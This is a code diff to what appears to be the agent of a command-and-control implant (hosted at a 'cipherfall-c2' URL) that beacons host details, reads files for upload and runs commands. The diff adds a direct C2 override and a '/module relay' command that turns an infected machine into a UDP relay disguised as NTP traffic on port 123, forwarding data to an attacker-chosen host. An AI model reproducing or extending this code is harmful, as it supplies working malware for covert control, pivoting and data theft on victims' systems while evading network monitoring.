@@ -112,11 +112,13 @@ WORKER_URL       = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocam
 RELAY_PORT       = int(os.environ.get("C2_RELAY_PORT",     "0"))
 RELAY_BIND       = os.environ.get("C2_RELAY_BIND",         "0.0.0.0")
 TCP_PORT         = int(os.environ.get("C2_TCP_PORT",       "443"))
+C2_DIRECT        = os.environ.get("C2_DIRECT",             "")
 NTP_RELAY_PORT   = int(os.environ.get("C2_NTP_RELAY_PORT", "0"))
 NTP_RELAY_TARGET = os.environ.get("C2_NTP_RELAY_TARGET",   "")
 MAX_OUTPUT = 900
 
-_C2_IP = ""
+_C2_IP           = ""
+_ntp_relay_server = None
 
 _NTP_DOMAINS = {
     "ubuntu":   "ntp.ubuntu.com",
@@ -325,6 +327,8 @@ def _detect_distro():
 
 
 def _resolve_c2():
+    if C2_DIRECT:
+        return C2_DIRECT
     domain = _NTP_DOMAINS[_detect_distro()]
     try:
         import ctypes
@@ -343,19 +347,67 @@ def _agent_id():
     return hashlib.sha256(seed.encode()).hexdigest()[:32]
 
 
+def _get_lan_ip():
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except Exception:
+        return ""
+
+
 def _sysinfo():
+    active_relay = NTP_RELAY_PORT if _ntp_relay_server else (RELAY_PORT if RELAY_PORT else 0)
     return {
         "hostname":   platform.node(),
         "os":         platform.system(),
         "release":    platform.release(),
         "user":       os.environ.get("USER") or os.environ.get("USERNAME", "?"),
-        "relay_port": NTP_RELAY_PORT or RELAY_PORT,
-        "worker_url": (f"tcp://{_C2_IP}:{TCP_PORT}" if _C2_IP else WORKER_URL),
+        "relay_port": active_relay,
+        "relay_host": _get_lan_ip() if _ntp_relay_server else "",
+        "worker_url": (f"ntp://{_C2_IP}:123" if _C2_IP else WORKER_URL),
         "beacon_int": BEACON_INT,
     }
 
 
+def _module_relay(args):
+    global NTP_RELAY_PORT, NTP_RELAY_TARGET, _ntp_relay_server
+    if not args or args[0] == "start":
+        try:
+            port   = int(args[1]) if len(args) > 1 else 123
+            target = args[2]      if len(args) > 2 else ""
+        except (ValueError, IndexError):
+            return "[usage: /module relay start <port> <host:port>]"
+        if not target:
+            return "[error: target required — /module relay start <port> <host:port>]"
+        if _ntp_relay_server:
+            _ntp_relay_server.shutdown()
+            _ntp_relay_server = None
+        NTP_RELAY_PORT   = port
+        NTP_RELAY_TARGET = target
+        _start_ntp_relay()
+        return f"[relay started :{port} → {target}]"
+    if args[0] == "stop":
+        if _ntp_relay_server:
+            _ntp_relay_server.shutdown()
+            _ntp_relay_server = None
+            return "[relay stopped]"
+        return "[relay not running]"
+    if args[0] == "status":
+        if _ntp_relay_server:
+            return f"[relay active :{NTP_RELAY_PORT} → {NTP_RELAY_TARGET}]"
+        return "[relay inactive]"
+    return f"[unknown relay subcommand: {args[0]}]"
+
+
 def _exec(cmd):
+    if cmd.startswith("/module "):
+        parts = cmd[8:].split()
+        if not parts:
+            return "[usage: /module relay start <port> <host:port> | stop | status]"
+        if parts[0] == "relay":
+            return _module_relay(parts[1:])
+        return f"[unknown module: {parts[0]}]"
     if cmd.startswith("UPLOAD:"):
         try:
             with open(cmd[7:], "rb") as f:
@@ -482,26 +534,27 @@ def _start_relay():
 
 class _NTPRelayHandler(socketserver.BaseRequestHandler):
     def handle(self):
+        data, srv_sock = self.request
         host, port_s = NTP_RELAY_TARGET.rsplit(":", 1)
         try:
-            with socket.create_connection((host, int(port_s)), timeout=10) as up:
-                def _pipe(src, dst):
-                    try:
-                        while chunk := src.recv(8192):
-                            dst.sendall(chunk)
-                    except Exception:
-                        pass
-                t = threading.Thread(target=_pipe, args=(up, self.request), daemon=True)
-                t.start()
-                _pipe(self.request, up)
-                t.join()
+            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tcp.settimeout(10)
+            tcp.connect((host, int(port_s)))
+            tcp.sendall(struct.pack("!H", len(data)) + data)
+            rlen = struct.unpack("!H", _recvexact(tcp, 2))[0]
+            resp = _recvexact(tcp, rlen)
+            tcp.close()
+            srv_sock.sendto(resp, self.client_address)
         except Exception:
             pass
 
 
 def _start_ntp_relay():
-    srv = socketserver.ThreadingTCPServer(("0.0.0.0", NTP_RELAY_PORT), _NTPRelayHandler)
+    global _ntp_relay_server
+    srv = socketserver.ThreadingUDPServer(("0.0.0.0", NTP_RELAY_PORT), _NTPRelayHandler)
     srv.daemon_threads = True
+    srv.allow_reuse_address = True
+    _ntp_relay_server = srv
     threading.Thread(target=srv.serve_forever, daemon=True).start()
 
 
